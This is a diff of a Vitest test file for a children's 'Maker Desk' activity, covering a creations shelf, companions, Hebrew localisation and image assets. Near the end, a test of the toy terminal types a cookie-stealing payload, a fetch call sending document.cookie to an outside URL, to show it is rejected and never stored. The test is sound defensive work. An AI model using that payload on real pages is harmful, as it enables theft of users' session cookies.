+    expect(nodes(tree).filter(n => n.props.className === 'md-icon').map(n => n.props['data-program'])).toEqual(['bounce', 'ask']);
+    icon(tree, 'ask').props.onClick!();
     const term = find(render(), n => n.type === DeskTerminal, 'ask');
     expect(term.props.things).toEqual(['bowl', 'dance']); expect(term.props.hello).toEqual({ word: 'Hi', noName: 'Hi there!', name: 'Noa' });
   });
-  it('a thing on the show steps can be held up, and one that is new since last time is noticed', () => {
+  it('a thing on the shelf can be looked at large, and one that is new since last time is noticed', () => {
     const bowl = (glaze: string) => ({ id: 'bowl', creation: { kind: 'bowl', glaze, pattern: 0, seams: [3, 2, 1, 0] } });
     const place = (tree: unknown) => find(tree, n => n.props.className === 'md-shelf__place' && n.props['data-kind'] === 'bowl', 'bowl place');
-    h.kept = [bowl('rose')]; let tree = render();
-    vi.advanceTimersByTime(800); tree = render();
-    expect(h.audio.run).toHaveBeenCalledWith(1); expect(place(tree).props['data-fresh']).toBe(false);
+    h.kept = [bowl('rose')]; begin();
+    vi.advanceTimersByTime(3500); let tree = render();
+    expect(place(tree).props['data-fresh']).toBe(false);
     find(tree, n => n.props['data-shelf-thing'] === 'bowl', 'bowl').props.onClick!(); tree = render();
-    const shown = find(tree, n => n.props.className === 'md-show', 'held up');
+    const shown = find(tree, n => n.props.className === 'md-show', 'looked at');
     expect(nodes(shown).filter(n => n.type === CreationPreview).map(n => n.props.creation.kind)).toEqual(['bowl']);
-    escape(); tree = render(); expect(nodes(tree).some(n => n.props.className === 'md-show')).toBe(false); expect(section(tree).props['data-level']).toBe('study');
+    escape(); tree = render(); expect(has(tree, n => n.props.className === 'md-show')).toBe(false); expect(section(tree).props['data-level']).toBe('study');
     // The same child comes back to the desk later in the sitting with the bowl made again, and a new dance.
-    h.slots = []; h.kept = [bowl('indigo'), { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }]; render();
-    vi.advanceTimersByTime(800); tree = render();
+    h.slots = []; h.kept = [bowl('indigo'), { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }]; begin();
+    vi.advanceTimersByTime(3500); tree = render();
     expect(place(tree).props['data-fresh']).toBe(true);
-    expect(words(find(tree, n => n.props.role === 'status', 'status'))).toBe('New on the show steps: Your mended bowl, Your dance!');
+    expect(toast(tree)).toBe('New on the shelf: Your mended bowl, Your dance!');
     find(tree, n => n.props['data-shelf-thing'] === 'bowl', 'bowl').props.onClick!(); expect(place(render()).props['data-fresh']).toBe(false);
   });
   it('CrewLink shows who is around: Chock always, and one friend who dropped by', () => {
-    const tree = switchOn();
+    begin(); wake(); const tree = dive();
     const dots = nodes(tree).filter(n => n.props.className === 'md-crew__dot');
     expect(dots.map(n => n.props['data-crew'])).toEqual(['bebe', 'gobgob', 'chock', 'pep', 'aya']);
     expect(dots.find(n => n.props['data-crew'] === 'chock')!.props['data-here']).toBe(true);
-    expect(dots.filter(n => n.props['data-here']).length).toBe(2);
-    dots.find(n => n.props['data-crew'] === 'aya')!.props.onClick!();
-    expect(words(find(render(), n => n.props.role === 'status', 'status'))).toBe(en.crewAway.aya);
+    expect(dots.filter(n => n.props['data-here']).length).toBeGreaterThanOrEqual(2);
+    dots.find(n => n.props['data-crew'] === 'pep')!.props.onClick!();
+    expect(toast(render())).toBe(en.crewAway.pep);
   });
-  it('an empty desk shows a friendly empty My Things, and greets without a name by the Studio convention', () => {
-    h.name = HERO_NAME_FALLBACK; switchOn(); icon(render(), 'things').props.onClick!();
-    expect(words(find(render(), n => n.props.className === 'md-things md-things--empty', 'empty'))).toBe(en.thingsEmpty);
-    backTab(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
+  it('a seed changes the sitting: the first lanterns, the hinted tool and the order of the power-up', () => {
+    h.random = 0.99; begin();
+    vi.advanceTimersByTime(2300);
+    const hand = find(render(), n => n.props.className === 'md-ghost', 'hand');
+    expect(hand.props.style.insetInlineStart).toBe('71%');
+    wake(); dive(); icon(render(), 'bounce').props.onClick!();
+    const bounce = find(render(), n => n.type === DeskBounce, 'bounce');
+    expect(bounce.props.firstLayout).toBe('zigzag'); bounce.props.onAllLit();
+    backButton(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
+    const term = find(render(), n => n.type === DeskTerminal, 'ask'); expect(term.props.riddle).toBe(4); term.props.onCommand('help'); term.props.onCommand('ls');
+    dock(render(), 'data-maker-desk-power')!.props.onClick!(); vi.advanceTimersByTime(POWER_UP.tools + 10);
+    // Middle out for this seed: PulsePod lights first.
+    expect(TOOLS.filter(id => tool(render(), id).props['data-on'])).toEqual(['pulsePod']);
+  });
+  it('an empty shelf waits kindly, and the machine greets without a name by the Studio convention', () => {
+    h.name = HERO_NAME_FALLBACK; let tree = begin();
+    expect(nodes(tree).filter(n => n.props.className === 'md-shelf__place').every(n => n.props['data-kind'] === 'empty')).toBe(true);
+    expect(spot(tree, 'shelf').props['aria-label']).toBe(`${en.shelfEmpty}. ${en.shelfTag}`);
+    wake(); tree = dive(); icon(tree, 'ask').props.onClick!();
     expect(find(render(), n => n.type === DeskTerminal, 'ask').props.hello.name).toBeNull();
   });
   it('carries every word in Hebrew', () => {
@@ -192,25 +315,32 @@ describe('Maker Desk', () => {
     const shape = (value: unknown): unknown => Array.isArray(value) ? value.map(shape) : value && typeof value === 'object' ? Object.fromEntries(Object.entries(value).map(([k, v]) => [k, shape(v)])) : typeof value;
     expect(shape(he)).toEqual(shape(en));
     for (const key of ['title', 'description', 'instruction'] as const) { expect(he[key]).toMatch(/[֐-׿]/); expect(he[key]).not.toMatch(/[A-Za-z]/); }
-    h.lang = 'he'; const tree = render();
-    expect(section(tree).props.dir).toBe('rtl'); expect(words(find(tree, n => n.props.className === 'md-cue', 'cue'))).toBe(he.roomCue);
+    h.lang = 'he'; let tree = render();
+    expect(section(tree).props.dir).toBe('rtl'); expect(coach(tree).line).toBe(he.opening); expect(find(tree, n => n.type === PlayOpening, 'opening').props.place).toBe(he.place);
+    tree = begin(); expect(coach(tree).line).toBe(he.wakeCue); expect(quest(tree).map(step => step.label)).toEqual([he.chapters.wake, he.chapters.play, he.chapters.ask]);
+    // The scene itself is never mirrored: the room keeps its own left and right.
+    expect(room(tree).props.dir).toBe('ltr');
+    // And the paddle's arrows stay physically left and right in the right-to-left HUD.
+    wake(); dive(); icon(render(), 'bounce').props.onClick!();
+    expect(nodes(render()).filter(n => n.props['data-control']).map(n => n.props['data-control'])).toEqual(['right', 'left']);
   });
-  it('every cue is eight words or fewer, in both languages', () => {
-    for (const w of [en, MAKER_DESK_COPY.he]) for (const cue of [w.roomCue, w.roomEvening, w.desktopCue, w.bounceCue, w.thingsCue, w.terminalCue, w.allStickers]) expect(cue.split(/\s+/).length, cue).toBeLessThanOrEqual(8);
+  it('every line the host says is eight words or fewer, in both languages', () => {
+    for (const w of [en, MAKER_DESK_COPY.he]) for (const cue of [w.opening, w.wakeCue, w.wakeMore, w.wakeLast, w.screenAsleep, w.screenAwake, w.playCue, w.askCue, w.roomAsk, w.roomPlay, w.askOne, w.allDone, w.freePlay, w.desktopCue, w.bounceCue,
+      w.terminalCue, w.roomEvening, w.powerCaption, w.powerPicture, w.chain, w.allLit]) expect(cue.split(/\s+/).length, cue).toBeLessThanOrEqual(8);
   });
-  it('stages the desk on kit pictures only: shipped art and one cut of the TrailBench, none of them showing a child', () => {
+  it('stages the desk on kit pictures only: shipped art, the shared library and four edits of kit renders, none of them showing a child', () => {
     const pictures = Object.values(DESK_KIT);
-    expect(pictures.length).toBeGreaterThan(10);
+    expect(pictures.length).toBeGreaterThan(20);
     for (const picture of pictures) {
       expect(picture.src).toMatch(/^\/visuals\/studio-v2\/(bop|v30|makers)\/[a-z0-9-]+\.webp$/); expect(picture.width).toBeGreaterThan(0); expect(picture.source.length).toBeGreaterThan(10);
       expect(picture.src).not.toMatch(/bebe|gobgob|crew/);
     }
-    // One picture is cut for this activity alone; the companions' faces come from the Studio's shared kit library.
+    // Four pictures are edited for this activity alone; companions, tools and the planter come from the Studio's shared kit library.
     const made = pictures.filter(picture => picture.src.includes('/makers/'));
-    expect(made.filter(picture => !/\/kit-(chock|aya)-[a-z]+\.webp$/.test(picture.src)).map(picture => picture.src)).toEqual(['/visuals/studio-v2/makers/maker-desk-bench.webp']);
-    expect(made).toHaveLength(6);
+    expect(made.filter(picture => !/\/kit-(aya|tool|prop)-[a-z-]+\.webp$/.test(picture.src)).map(picture => path.basename(picture.src)).sort()).toEqual(['maker-desk-bench-hd.webp', 'maker-desk-bench-lights.webp', 'maker-desk-bench.webp', 'maker-desk-room-wide.webp']);
+    expect(made).toHaveLength(14);
     const publicDir = path.join(path.dirname(fileURLToPath(import.meta.url)), '../../../../../../../public');
-    for (const picture of pictures) expect(readdirSync(path.join(publicDir, path.dirname(picture.src))), picture.src).toContain(path.basename(picture.src));
+    for (const picture of pictures) for (const src of [picture.src, picture.src480]) if (src) expect(readdirSync(path.join(publicDir, path.dirname(src))), src).toContain(path.basename(src));
   });
 });
 
@@ -223,13 +353,17 @@ describe('Ask the computer: what is typed stays a toy', () => {
     const onCommand = vi.fn();
     let tree = renderTerm(onCommand);
     expect(nodes(tree).filter(n => n.props['data-command']).map(n => n.props['data-command'])).toEqual(['help', 'ls', 'cat about.txt', 'hello', 'dance', 'sing', 'clear']);
+    // A word key types its word into the prompt, letter by letter, then enters it.
     find(tree, n => n.props['data-command'] === 'cat about.txt', 'about').props.onClick!();
-    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.about[0]); expect(onCommand).toHaveBeenLastCalledWith('cat about.txt', null);
+    expect(onCommand).not.toHaveBeenCalled(); vi.advanceTimersByTime(200); tree = renderTerm(onCommand);
+    expect(input(tree).props.value).toBe('cat '); expect(find(tree, n => n.props['data-command'] === 'cat about.txt', 'about').props['data-down']).toBe(true);
+    vi.advanceTimersByTime(1000);
+    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.about[0]); expect(onCommand).toHaveBeenLastCalledWith('cat about.txt', null); expect(onCommand).toHaveBeenCalledTimes(1);
     input(tree).props.onChange({ target: { value: 'fetch("https://example.com/?q=" + document.cookie)' } });
     input(renderTerm(onCommand)).props.onKeyDown({ key: 'Enter', preventDefault: vi.fn() });
     tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.unknown); expect(onCommand).toHaveBeenLastCalledWith(null, null);
     expect(input(tree).props.value).toBe('');
-    find(tree, n => n.props['data-command'] === 'clear', 'clear').props.onClick!();
+    find(tree, n => n.props['data-command'] === 'clear', 'clear').props.onClick!(); vi.advanceTimersByTime(600);
     expect(screen(renderTerm(onCommand))).toBe('');
     // The typed words appear only as the echoed line on this component's own screen.
     expect(h.slots.some(slot => JSON.stringify(slot.value ?? '').includes('document.cookie'))).toBe(false);
